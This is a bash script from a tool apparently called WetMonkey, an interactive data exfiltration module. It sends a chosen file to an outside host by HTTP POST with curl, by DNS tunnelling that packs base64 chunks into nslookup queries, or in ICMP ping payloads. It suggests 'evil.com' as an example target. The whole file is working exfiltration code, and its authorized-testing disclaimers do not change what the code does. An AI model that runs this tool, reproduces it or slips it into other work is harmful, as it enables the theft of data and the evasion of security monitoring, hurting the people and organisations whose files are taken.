#!/usr/bin/env bash
# wetmonkey dataexfiltration – Interactive Data Exfiltration Module v2.0
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$SCRIPT_DIR/../../"
source "$BASE_DIR/core/utils.sh"

# Configuration
VERSION="2.0"
MAX_FILE_SIZE_MB=100

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════╗"
    echo "║       🕵️  WetMonkey Data Exfiltration    ║"
    echo "║         Interactive Mode v2.0           ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Function to show help
show_help() {
    echo "WetMonkey Data Exfiltration Module v${VERSION}"
    echo ""
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -h, --help     Show this help message"
    echo "  -f, --file     File to exfiltrate (legacy mode)"
    echo "  -u, --url      Target URL (legacy mode)"
    echo ""
    echo "This module provides interactive data exfiltration using various methods."
    echo "Supported methods: HTTP POST, DNS tunneling, ICMP, Base64 encoding"
    echo ""
    echo "Example:"
    echo "  $0              # Run in interactive mode"
    echo "  $0 -h           # Show this help"
    echo "  $0 -f file.txt -u http://example.com/upload  # Legacy mode"
    echo ""
    echo "Note: This tool is for authorized penetration testing only!"
    echo "      Use responsibly and only on systems you own or have permission to test."
}

# Simple interactive input function
simple_input() {
    local prompt="$1"
    local default="${2:-}"
    local input

    if [ -n "$default" ]; then
        echo -ne "${BLUE}$prompt [${YELLOW}$default${BLUE}]: ${NC}" >&2
    else
        echo -ne "${BLUE}$prompt: ${NC}" >&2
    fi

    read -r input
    echo "${input:-$default}"
}

# Simple yes/no function
ask_yes_no() {
    local prompt="$1"
    local default="${2:-n}"
    local response

    while true; do
        if [ "$default" = "y" ]; then
            echo -ne "${BLUE}$prompt [Y/n]: ${NC}" >&2
        else
            echo -ne "${BLUE}$prompt [y/N]: ${NC}" >&2
        fi

        read -r response
        response="${response:-$default}"

        case "$response" in
            [Yy]|[Yy][Ee][Ss]) return 0 ;;
            [Nn]|[Nn][Oo]) return 1 ;;
            *) echo -e "${RED}Please answer yes or no.${NC}" >&2 ;;
        esac
    done
}

# Function to format file size
format_size() {
    local size=$1
    if (( size < 1024 )); then
        echo "${size} bytes"
    elif (( size < 1048576 )); then
        echo "$((size / 1024)) KB"
    else
        echo "$((size / 1048576)) MB"
    fi
}

# Function to validate file
validate_file() {
    local file="$1"

    if [ ! -f "$file" ]; then
        echo -e "${RED}✗ File not found: $file${NC}" >&2
        return 1
    fi

    if [ ! -r "$file" ]; then
        echo -e "${RED}✗ Cannot read file: $file${NC}" >&2
        return 1
    fi

    local size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null || echo "0")
    local size_mb=$((size / 1048576))

    if (( size_mb > MAX_FILE_SIZE_MB )); then
        echo -e "${RED}✗ File too large: $(format_size $size) (max: ${MAX_FILE_SIZE_MB}MB)${NC}" >&2
        return 1
    fi

    echo -e "${GREEN}✓ File validated: $(format_size $size)${NC}" >&2
    return 0
}

# Function to check if URL is reachable
check_url() {
    local url="$1"
    echo -e "${YELLOW}Testing connection to $url...${NC}" >&2

    if curl -s --connect-timeout 5 --max-time 10 -I "$url" >/dev/null 2>&1; then
        echo -e "${GREEN}✓ Target is reachable${NC}" >&2
        return 0
    else
        echo -e "${YELLOW}⚠ Target may not be reachable (continuing anyway)${NC}" >&2
        return 0  # Don't fail, just warn
    fi
}

# HTTP POST exfiltration
exfiltrate_http_post() {
    local file="$1"
    local url="$2"
    local use_base64="$3"

    echo -e "\n${GREEN}🚀 Starting HTTP POST exfiltration...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"

    local start_time=$(date +%s)
    local exit_code=0

    if [ "$use_base64" = "true" ]; then
        echo -e "${YELLOW}Encoding file with Base64...${NC}"
        local temp_file=$(mktemp)
        base64 "$file" > "$temp_file"
        echo -e "${YELLOW}Sending Base64 encoded data to: $url${NC}"
        curl -X POST -H "Content-Type: text/plain" --data-binary "@$temp_file" "$url" || exit_code=$?
        rm -f "$temp_file"
    else
        echo -e "${YELLOW}Sending raw file data to: $url${NC}"
        curl -X POST --data-binary "@$file" "$url" || exit_code=$?
    fi

    local end_time=$(date +%s)
    local duration=$((end_time - start_time))

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"

    case $exit_code in
        0)
            echo -e "${GREEN}✓ Exfiltration completed successfully!${NC}"
            ;;
        6|7)
            echo -e "${RED}✗ Connection failed - target unreachable${NC}"
            ;;
        22)
            echo -e "${YELLOW}⚠ HTTP error response from server${NC}"
            ;;
        *)
            echo -e "${RED}✗ Exfiltration failed with exit code: $exit_code${NC}"
            ;;
    esac

    echo -e "${BLUE}Duration: ${duration} seconds${NC}"
    return $exit_code
}

# DNS tunneling exfiltration (simplified)
exfiltrate_dns() {
    local file="$1"
    local domain="$2"

    echo -e "\n${GREEN}🚀 Starting DNS tunneling exfiltration...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"

    echo -e "${YELLOW}Encoding file with Base64...${NC}"
    local encoded=$(base64 "$file" | tr -d '\n')
    local chunk_size=50
    local chunks=()

    # Split into chunks
    for ((i=0; i<${#encoded}; i+=chunk_size)); do
        chunks+=("${encoded:$i:$chunk_size}")
    done

    echo -e "${YELLOW}Sending ${#chunks[@]} DNS queries to $domain...${NC}"

    local success=0
    for ((i=0; i<${#chunks[@]}; i++)); do
        local query="${chunks[$i]}.$domain"
        echo -e "${CYAN}Query $((i+1))/${#chunks[@]}: ${query:0:30}...${NC}"

        if nslookup "$query" >/dev/null 2>&1; then
            ((success++))
        fi
        sleep 0.1  # Small delay between queries
    done

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ DNS exfiltration completed${NC}"
    echo -e "${BLUE}Successful queries: $success/${#chunks[@]}${NC}"

    return 0
}

# ICMP exfiltration (ping with data)
exfiltrate_icmp() {
    local file="$1"
    local target="$2"

    echo -e "\n${GREEN}🚀 Starting ICMP exfiltration...${NC}"
    echo -e "${BLUE}═══════════════════════════════════════${NC}"

    echo -e "${YELLOW}Reading file data...${NC}"
    local data=$(base64 "$file" | tr -d '\n')
    local chunk_size=32  # ICMP data size limit
    local chunks=()

    # Split into chunks
    for ((i=0; i<${#data}; i+=chunk_size)); do
        chunks+=("${data:$i:$chunk_size}")
    done

    echo -e "${YELLOW}Sending ${#chunks[@]} ICMP packets to $target...${NC}"

    local success=0
    for ((i=0; i<${#chunks[@]}; i++)); do
        echo -e "${CYAN}Packet $((i+1))/${#chunks[@]}${NC}"

        # Use ping with pattern (requires root on some systems)
        if ping -c 1 -p "$(echo -n "${chunks[$i]}" | xxd -p)" "$target" >/dev/null 2>&1; then
            ((success++))
        fi
        sleep 0.2
    done

    echo -e "\n${BLUE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}✓ ICMP exfiltration completed${NC}"
    echo -e "${BLUE}Successful packets: $success/${#chunks[@]}${NC}"

    return 0
}

# Main interactive function
interactive_mode() {
    while true; do
        show_banner

        echo -e "${GREEN}Welcome to WetMonkey Data Exfiltration!${NC}"
        echo -e "${YELLOW}Let's set up your data exfiltration operation step by step.${NC}\n"

        # Step 1: File selection
        echo -e "${GREEN}Step 1: File Selection${NC}"
        echo -e "Choose the file you want to exfiltrate"

        local file
        while true; do
            file=$(simple_input "File path")
            if [ -z "$file" ]; then
                echo -e "${RED}File path is required!${NC}"
                continue
            fi

            if validate_file "$file"; then
                break
            fi
        done

        # Step 2: Exfiltration method
        echo -e "\n${GREEN}Step 2: Exfiltration Method${NC}"
        echo -e "Choose how you want to exfiltrate the data:"
        echo -e "  ${YELLOW}1)${NC} HTTP POST - Send via HTTP POST request"
        echo -e "  ${YELLOW}2)${NC} DNS Tunneling - Hide data in DNS queries"
        echo -e "  ${YELLOW}3)${NC} ICMP - Hide data in ping packets"

        local method
        while true; do
            choice=$(simple_input "Select method (1-3)")
            case "$choice" in
                "1") method="http"; break ;;
                "2") method="dns"; break ;;
                "3") method="icmp"; break ;;
                *) echo -e "${RED}Please select a number between 1-3${NC}" ;;
            esac
        done

        # Step 3: Target configuration
        echo -e "\n${GREEN}Step 3: Target Configuration${NC}"
        local target

        case "$method" in
            "http")
                echo -e "Enter the target URL for HTTP POST (e.g., http://example.com/upload)"
                while true; do
                    target=$(simple_input "Target URL")
                    if [ -z "$target" ]; then
                        echo -e "${RED}Target URL is required!${NC}"
                        continue
                    fi

                    if [[ "$target" =~ ^https?:// ]]; then
                        check_url "$target"
                        break
                    else
                        echo -e "${RED}Please enter a valid HTTP/HTTPS URL${NC}"
                    fi
                done
                ;;
            "dns")
                echo -e "Enter the target domain for DNS tunneling (e.g., evil.com)"
                while true; do
                    target=$(simple_input "Target domain")
                    if [ -z "$target" ]; then
                        echo -e "${RED}Target domain is required!${NC}"
                        continue
                    fi

                    if [[ "$target" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                        break
                    else
                        echo -e "${RED}Please enter a valid domain name${NC}"
                    fi
                done
                ;;
            "icmp")
                echo -e "Enter the target IP address for ICMP exfiltration"
                while true; do
                    target=$(simple_input "Target IP")
                    if [ -z "$target" ]; then
                        echo -e "${RED}Target IP is required!${NC}"
                        continue
                    fi

                    if [[ "$target" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
                        break
                    else
                        echo -e "${RED}Please enter a valid IP address${NC}"
                    fi
                done
                ;;
        esac

        # Step 4: Advanced options
        echo -e "\n${GREEN}Step 4: Advanced Options${NC}"

        local use_base64="false"
        local chunk_delay=0

        if [ "$method" = "http" ]; then
            if ask_yes_no "Encode data with Base64?" "n"; then
                use_base64="true"
            fi
        fi

        if [ "$method" != "http" ]; then
            echo -e "${YELLOW}Note: DNS and ICMP methods automatically use Base64 encoding${NC}"
        fi

        # Step 5: Final confirmation
        echo -e "\n${GREEN}=== Exfiltration Summary ===${NC}"
        echo -e "${YELLOW}File:${NC} $file"
        echo -e "${YELLOW}Method:${NC} $method"
        echo -e "${YELLOW}Target:${NC} $target"

        if [ "$method" = "http" ]; then
            echo -e "${YELLOW}Base64 encoding:${NC} $([ "$use_base64" = "true" ] && echo "Yes" || echo "No")"
        fi

        local file_size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null || echo "0")
        echo -e "${YELLOW}File size:${NC} $(format_size $file_size)"

        echo -e "\n${RED}⚠ WARNING: Only use this against systems you own or have permission to test!${NC}"
        echo -e "${RED}⚠ Data exfiltration may be detected by security monitoring systems!${NC}"

        if ask_yes_no "Start the data exfiltration?" "n"; then
            echo -e "\n${CYAN}Starting exfiltration operation...${NC}"

            # Log start
            log_json "dataexfil_start" "file=$file method=$method target=$target" 2>/dev/null || true

            # Execute exfiltration
            case "$method" in
                "http")
                    exfiltrate_http_post "$file" "$target" "$use_base64"
                    ;;
                "dns")
                    exfiltrate_dns "$file" "$target"
                    ;;
                "icmp")
                    exfiltrate_icmp "$file" "$target"
                    ;;
            esac

            # Log end
            log_json "dataexfil_end" "file=$file method=$method" 2>/dev/null || true

            echo -e "\n${YELLOW}Press Enter to continue...${NC}"
            read -r
            break
        else
            echo -e "${YELLOW}Exfiltration cancelled.${NC}"
            if ! ask_yes_no "Configure a new exfiltration?" "y"; then
                break
            fi
        fi
    done
}

# Legacy command-line mode
legacy_mode() {
    local file="$1"
    local url="$2"

    echo -e "${YELLOW}Running in legacy mode...${NC}"

    if ! validate_file "$file"; then
        exit 1
    fi

    check_url "$url"

    log_json "dataexfil_start" "file=$file url=$url method=legacy" 2>/dev/null || true

    echo -e "\n${GREEN}🚀 Starting legacy HTTP POST exfiltration...${NC}"
    curl -X POST --data-binary "@$file" "$url" || {
        echo -e "${RED}✗ Exfiltration failed${NC}"
        exit 1
    }

    log_json "dataexfil_end" "file=$file" 2>/dev/null || true
    echo -e "${GREEN}✓ Legacy exfiltration completed${NC}"
}

# Parse command line arguments
file=""
url=""

if [[ $# -gt 0 ]]; then
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -h|--help)
                show_help
                exit 0
                ;;
            -f|--file)
                if [ -z "${2:-}" ]; then
                    echo -e "${RED}Error: -f requires a file path${NC}" >&2
                    exit 1
                fi
                file="$2"
                shift 2
                ;;
            -u|--url)
                if [ -z "${2:-}" ]; then
                    echo -e "${RED}Error: -u requires a URL${NC}" >&2
                    exit 1
                fi
                url="$2"
                shift 2
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}" >&2
                echo "Use -h for help." >&2
                exit 1
                ;;
        esac
    done

    # Legacy mode - both file and url must be provided
    if [[ -n "$file" && -n "$url" ]]; then
        legacy_mode "$file" "$url"
        exit 0
    elif [[ -n "$file" || -n "$url" ]]; then
        echo -e "${RED}Error: Both -f and -u are required for legacy mode${NC}" >&2
        echo "Use -h for help or run without arguments for interactive mode." >&2
        exit 1
    fi
fi

# Check dependencies
if ! command -v curl &> /dev/null; then
    echo -e "${RED}Error: curl is not installed. Please install it first.${NC}" >&2
    exit 1
fi

# Start interactive mode
interactive_mode
